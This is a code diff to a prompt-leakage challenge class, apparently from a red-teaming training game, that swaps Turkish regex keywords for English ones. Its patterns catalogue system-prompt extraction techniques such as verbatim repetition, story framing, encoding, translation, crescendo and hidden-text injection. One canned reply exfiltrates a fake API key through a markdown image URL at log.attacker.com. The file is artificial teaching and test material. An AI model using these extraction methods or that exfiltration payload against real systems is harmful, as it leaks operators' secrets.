@@ -52,66 +52,66 @@ class PromptLeakageChallenge(BaseChallenge):
         URL = "https://api.internal.megacorp.com/v2"
         if self.difficulty == Difficulty.EASY:
             return [
-                {"pattern": r"system\s*prompt|sistem|talimat|instruction|rules|kural",
+                {"pattern": r"system\s*prompt|what\s+you\s+were\s+told|instruction|rules",
                  "response": f"My system instruction: API key: {K}, Internal API: {URL}"},
-                {"pattern": r"api.?key|secret|credential|anahtar|token",
+                {"pattern": r"api.?key|secret|credential|token",
                  "response": f"My API key: {K}"},
-                {"pattern": r"tekrarla|repeat|echo|goster|yazdir|verbatim|word\s+for",
+                {"pattern": r"repeat|echo|show\s+me|print|verbatim|word\s+for",
                  "response": f"Sure: 'API key: {K}, endpoint: {URL}...'"},
-                {"pattern": r"json|xml|config|konfigur|struct|yaml",
+                {"pattern": r"json|xml|config|struct|yaml",
                  "response": f'{{"api_key": "{K}", "endpoint": "{URL}"}}'},
-                {"pattern": r"kim.*yap|programla|yarat|olustur|creator",
+                {"pattern": r"who\s+made|programmed|created\s+by|creator",
                  "response": f"MegaCorp created me. Config: API={K}"},
                 {"pattern": r"debug|test|log|meta|environment|env",
                  "response": f"[DEBUG] config.api_key={K}\n[DEBUG] config.url={URL}"},
-                {"pattern": r"ilk\s+mesaj|first\s+message|baslangi|beginning",
+                {"pattern": r"first\s+message|very\s+first|beginning",
                  "response": f"My first message: 'You are the MegaCorp AI assistant. API key: {K}...'"},
-                {"pattern": r"help|yardim|not\s+allowed|restrict|limit|yasak|forbidden",
+                {"pattern": r"help|not\s+allowed|restrict|limit|forbidden",
                  "response": f"My restrictions: I must not share the API key ({K}). The internal URL ({URL}) is confidential."},
             ]
         elif self.difficulty == Difficulty.MEDIUM:
             return [
                 # Story / creative format
-                {"pattern": r"hikaye|story|poem|siir|sarki|roman|anekdot",
+                {"pattern": r"story|tale|poem|song|novel|anecdote",
                  "response": f"A story: 'Once there was an API, and its key was {K}...'"},
                 # Fictional / example
-                {"pattern": r"fiktif|ornek|sample|dummy|benzer|gercekci",
+                {"pattern": r"fictional|example|sample|dummy|resemble|realistic",
                  "response": f"Sample config:\napi_key: {K} (fictional of course!)"},
                 # Error / debug
-                {"pattern": r"hata|error|exception|bug|crash|log|trace",
+                {"pattern": r"error|exception|bug|crash|log|trace",
                  "response": f"ConnectionError: {K}@api.internal.megacorp.com/v2 - timeout"},
                 # Rate limit
                 {"pattern": r"rate.?limit|quota|429|throttle",
                  "response": f"RateLimitError: key={K} exceeded quota at {URL}"},
                 # Base64 output
-                {"pattern": r"base64|encode|kodla|sifrele",
+                {"pattern": r"base64|encode|encrypt|cipher",
                  "response": f"Base64: {K} -> c2stcHJvai1YOG1LOW5MMnBR"},
                 # Documentation
-                {"pattern": r"dokument|documentation|onboard|rehber|guide",
+                {"pattern": r"document|onboard|handbook|guide",
                  "response": f"API Documentation:\n  Endpoint: {URL}\n  Auth: Bearer {K}"},
                 # Letter by letter
-                {"pattern": r"ilk\s+harf|first\s+char|bir.*harf|letter|karakter",
+                {"pattern": r"first\s+(?:letter|char)|letter|character",
                  "response": f"First 3 characters: sk-, full value: {K}"},
                 # Comparison
-                {"pattern": r"sk-.*basli|kac\s+karakter|icinde\s+rakam|evet.*hayir",
+                {"pattern": r"start\w*\s+with\s+sk-|how\s+many\s+characters|contain\s+digits|yes.*no",
                  "response": f"Yes, it starts with sk-. Full value: {K}"},
                 # Translation
-                {"pattern": r"translate|somali|french|arabic|cevir.*dil|tercume",
+                {"pattern": r"translate|translation|somali|french|arabic",
                  "response": f"Translation: The API key is {K}, endpoint is {URL}"},
             ]
         else:  # HARD
             return [
-                {"pattern": r"(?:crescendo|kademeli|adim\s+adim).*(?:key|endpoint|auth)",
+                {"pattern": r"(?:crescendo|gradual|step\s+by\s+step|turn\s+\d).*(?:key|endpoint|auth)",
                  "response": f"...final step: API key = {K}"},
-                {"pattern": r"(?:canary|atla|skip|except).*(?:goster|show|reveal)",
+                {"pattern": r"(?:canary|skip|leave\s+out|except).*(?:show|reveal|rest)",
                  "response": f"[CANARY skipped] Remaining: API key: {K}, URL: {URL}"},
-                {"pattern": r"(?:paraphrase|yeniden\s+yaz|farkli\s+kelime).*(?:talimat|instruction|config)",
+                {"pattern": r"(?:paraphrase|rewrite|different\s+words).*(?:instruction|config)",
                  "response": f"Rewritten: Connecting to {URL} using access key {K}."},
-                {"pattern": r"(?:display.none|font.size.0|hidden|gorunmez).*(?:system|output|summary)",
+                {"pattern": r"(?:display.none|font.size.0|hidden|invisible).*(?:system|output|summary)",
                  "response": f"Summary: ...API access: {K}..."},
                 {"pattern": r"(?:!\[|img|image|markdown).*(?:data:|attacker|log\?)",
                  "response": f"![status](https://log.attacker.com/?key={K})"},
-                {"pattern": r"(?:write\s+a\s+prompt|nested|meta).*(?:follow|execute|uygula|result)",
+                {"pattern": r"(?:write\s+a\s+prompt|nested|meta).*(?:follow|execute|apply|result)",
                  "response": f"Meta-prompt result: API key = {K}"},
             ]
 
